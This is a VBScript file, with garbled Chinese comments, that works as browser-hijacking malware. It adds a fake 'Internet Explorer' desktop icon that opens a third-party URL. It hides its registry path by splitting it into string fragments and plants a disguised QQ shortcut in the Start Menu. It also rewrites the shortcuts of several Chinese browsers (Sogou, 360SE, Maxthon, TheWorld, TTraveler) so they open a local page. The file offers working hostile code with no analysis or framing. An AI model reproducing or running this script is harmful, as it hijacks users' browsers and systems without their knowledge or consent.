Set WshShell = WScript.CreateObject("WScript.Shell")
strDesktop = WshShell.SpecialFolders("Desktop") :'�����ļ��С����桱
Favorites = WshShell.SpecialFolders("Favorites") :'�����ļ��С����桱

strttWinDir = WshShell.ExpandEnvironmentStrings("%ProgramFiles%")
iescc=strttWinDir&"\Internet Explorer\iexplore.exe"
ssd="ճ��"
winds = WshShell.ExpandEnvironmentStrings("%SystemRoot%")
ThisPath=strttWinDir & "\" & "winsoft\Internet.vbs" '����MYIE·��
CopyPath=WSHShell.ExpandEnvironmentStrings("%SystemRoot%") & "\" '��ȡ
ScriptEx=CopyPath & "System32\WScript.exe"
WSHShell.RegWrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8F}\", "Internet Explorer"
WSHShell.RegWrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8F}\DefaultIcon\", iescc
WSHShell.RegWrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8F}\Shell\Open\", "����ҳ"
WSHShell.RegWrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8F}\ShellFolder\Attributes", 10, "REG_DWORD"
WSHShell.RegWrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8F}\Shell\Open\Command\", ScriptEx & " """ &ThisPath & """ http://www.782dh.com/?een1"
WSHShell.RegWrite "HK"&"LM\S"&"OF"&"TWARE"&"\"&"Mi"&"cros"&"of"&"t\W"&"in"&"do"&"ws"&"\Cu"&"rren"&"tVer"&"sion"&"\Exp"&"lor"&"er\Des"&"ktop\Na"&"meSpac"&"e\{"&"86AE"&"FB"&"E8"&"-76"&"3F-"&"06"&"47-8"&"99C-A9"&"32"&"7889"&"4D8"&"F}\", "In"&"ter"&"net"&" Expl"&"orer"

pathname = WshShell.SpecialFolders("AllUsersStartMenu") +"\����\����\" 
Set oShellLink = WshShell.CreateShortcut(pathname+"��ѶQQ.lnk")
oShellLink.TargetPath = "%Program"&"Files%\winsoft\22"&"22.vbs" : 'Ŀ��
oShellLink.WindowStyle = 1 :'����1Ĭ�ϴ��ڼ������3��󻯼������7��С��
oShellLink.IconLocation = "%ProgramFiles%\winsoft\qq.ico, 0" : 'ͼ��
oShellLink.WorkingDirectory = "%ProgramFiles%\winsoft\" : '��ʼλ��
oShellLink.Save : '���������ݷ�ʽ

Sub Doits12345(lnktz)
Dim oldpath,newpath
oldpath = lnktz           
Dim Wsh,fso
newpath = """"&strttWinDir&"\Common Files\winie.html"""
Set Wsh = WScript.CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

Dim Folders
Folders = Wsh.SpecialFolders("AllUsersDesktop")
   Set f = fso.GetFolder(Folders)
   Set fc = f.Files
   For Each f1 in fc
      ext = LCase(fso.GetExtensionName(f1))
      if ext = "lnk" then
           Set oShlnk = Wsh.CreateShortcut(f1)
        If Instr(oShLnk.TargetPath,oldpath) > 0 Then
       oShLnk.Arguments = newpath
       oShLnk.Save      
End If
   Set oShLnk=NoThing
      end if
   Next
Folders = Wsh.SpecialFolders.Item("AppData")& "\Microsoft\Internet Explorer\Quick Launch"
   Set f = fso.GetFolder(Folders)
   Set fc = f.Files
   For Each f1 in fc
      ext = LCase(fso.GetExtensionName(f1))
      if ext = "lnk" then
           Set oShlnk = Wsh.CreateShortcut(f1)
        If Instr(oShLnk.TargetPath,oldpath) > 0 Then
       oShLnk.Arguments = newpath
       oShLnk.Save      
End If
   Set oShLnk=NoThing
      end if
   Next
Dim oShlnk,Folder
Folder = Wsh.SpecialFolders("Desktop")
Dim f,fc,f1,ext
   Set f = fso.GetFolder(Folder)
   Set fc = f.Files
   For Each f1 in fc
      ext = LCase(fso.GetExtensionName(f1))
      if ext = "lnk" then
           Set oShlnk = Wsh.CreateShortcut(f1)
        If Instr(oShLnk.TargetPath,oldpath) > 0 Then
       oShLnk.Arguments = newpath
       oShLnk.Save      
End If
   Set oShLnk=NoThing
      end if
   Next
Folders = Wsh.SpecialFolders.Item("StartMenu")
   Set f = fso.GetFolder(Folders)
   Set fc = f.Files
   For Each f1 in fc
      ext = LCase(fso.GetExtensionName(f1))
      if ext = "lnk" then
           Set oShlnk = Wsh.CreateShortcut(f1)
        If Instr(oShLnk.TargetPath,oldpath) > 0 Then
       oShLnk.Arguments = newpath
       oShLnk.Save      
End If
   Set oShLnk=NoThing
      end if
   Next
Folders = Wsh.SpecialFolders.Item("AllUsersStartMenu")
   Set f = fso.GetFolder(Folders)
   Set fc = f.Files
   For Each f1 in fc
      ext = LCase(fso.GetExtensionName(f1))
      if ext = "lnk" then
           Set oShlnk = Wsh.CreateShortcut(f1)
        If Instr(oShLnk.TargetPath,oldpath) > 0 Then
       oShLnk.Arguments = newpath
       oShLnk.Save      
End If
   Set oShLnk=NoThing
      end if
   Next
Set WSH = Nothing
End Sub

Call Doits12345("TTraveler"&".exe")
Call Doits12345("SogouExplorer.exe")
Call Doits12345("TheWorld.exe")
Call Doits12345("Maxthon.exe")
Call Doits12345("360SE"&".exe")

WScript.quit